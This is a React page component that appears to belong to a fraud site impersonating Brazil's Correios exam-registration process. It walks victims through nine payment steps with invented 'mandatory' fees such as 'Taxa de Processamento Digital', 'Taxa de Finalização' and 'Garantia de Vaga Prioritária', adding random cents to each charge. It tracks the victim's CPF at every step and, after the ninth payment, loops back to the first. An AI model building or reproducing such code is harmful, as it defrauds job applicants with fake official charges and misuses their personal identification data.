import { useEffect } from "react";
import { useNavigate, useLocation, useParams } from "react-router-dom";
import CorreiosHeader from "@/components/CorreiosHeader";
import CorreiosFooter from "@/components/CorreiosFooter";
import UpsellStep from "@/components/UpsellStep";
import { CPFData } from "@/lib/cpf";
import { getSession, saveSession } from "@/hooks/useSessionPersistence";
import { buildUrlWithUtm } from "@/hooks/useUtmTracking";
import { trackFunnelEvent } from "@/hooks/useFunnelTracking";

const UPSELLS = [
  { valor: 34, title: "Material para Dia da Prova", description: "Kit completo com caderno de questões, folha de respostas e caneta homologada para o dia da prova." },
  { valor: 29, title: "Taxa de Processamento Digital", description: "Taxa obrigatória para processamento digital da inscrição no sistema dos Correios." },
  { valor: 34, title: "Seguro de Inscrição", description: "Seguro que garante reembolso integral caso o concurso seja cancelado ou adiado." },
  { valor: 19, title: "Taxa de Confirmação de Vaga", description: "Confirmação e reserva da sua vaga para a data de prova selecionada." },
  { valor: 42, title: "Kit Preparatório Express", description: "Kit com resumos, mapas mentais e questões comentadas para revisão de última hora." },
  { valor: 15, title: "Taxa de Emissão de Comprovante", description: "Emissão do comprovante oficial de inscrição com código de autenticação." },
  { valor: 22, title: "Certificado de Inscrição Digital", description: "Certificado digital de inscrição válido como documento oficial do concurso." },
  { valor: 12, title: "Taxa de Finalização", description: "Taxa final para encerramento do processo de inscrição no sistema." },
  { valor: 89, title: "Garantia de Vaga Prioritária", description: "IMPORTANTE: Garante prioridade na alocação da sua vaga na agência mais próxima." },
];

const Upsell = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { step } = useParams<{ step: string }>();

  const parsedStep = parseInt(step || "1", 10);
  const stepNumber = isNaN(parsedStep) ? 1 : Math.min(Math.max(parsedStep, 1), 9);
  const currentIndex = stepNumber - 1;
  const currentUpsell = UPSELLS[currentIndex];

  // Add random cents
  const valorComCentavos = currentUpsell.valor + (Math.floor(Math.random() * 99) + 1) / 100;

  const session = getSession();
  const cpfData: CPFData | undefined = location.state?.cpfData || session?.cpfData;
  const valorBeneficio: number | undefined = location.state?.valorBeneficio || session?.valorBeneficio;
  const protocolo: string | undefined = location.state?.protocolo || session?.protocolo;

  useEffect(() => { window.scrollTo(0, 0); }, [stepNumber]);

  useEffect(() => {
    if (!cpfData) { navigate("/"); return; }
    saveSession({ cpfData, currentStep: `/upsell/${stepNumber}`, valorBeneficio, protocolo });
    trackFunnelEvent(`upsell-${stepNumber}`, { cpf: cpfData.cpf });
  }, [cpfData, valorBeneficio, protocolo, navigate, stepNumber]);

  const handlePaymentConfirmed = () => {
    const stateData = { cpfData, valorBeneficio, protocolo };
    if (stepNumber < 9) {
      navigate(buildUrlWithUtm(`/upsell-info/${stepNumber + 1}`), { state: stateData });
    } else {
      navigate(buildUrlWithUtm("/upsell-info/1"), { state: stateData });
    }
  };

  if (!cpfData) return null;

  return (
    <div className="min-h-screen flex flex-col bg-background">
      <CorreiosHeader breadcrumb={`Concursos > Inscrição > Etapa ${stepNumber}/9`} />

      <main className="flex-1 flex items-center justify-center px-4 py-6 sm:py-8">
        <UpsellStep
          key={stepNumber}
          title={currentUpsell.title}
          description={currentUpsell.description}
          valor={valorComCentavos}
          cpfData={cpfData}
          protocolo={protocolo || `COR${Date.now()}`}
          onPaymentConfirmed={handlePaymentConfirmed}
          stepNumber={stepNumber}
          totalSteps={9}
        />
      </main>

      <CorreiosFooter />
    </div>
  );
};

export default Upsell;
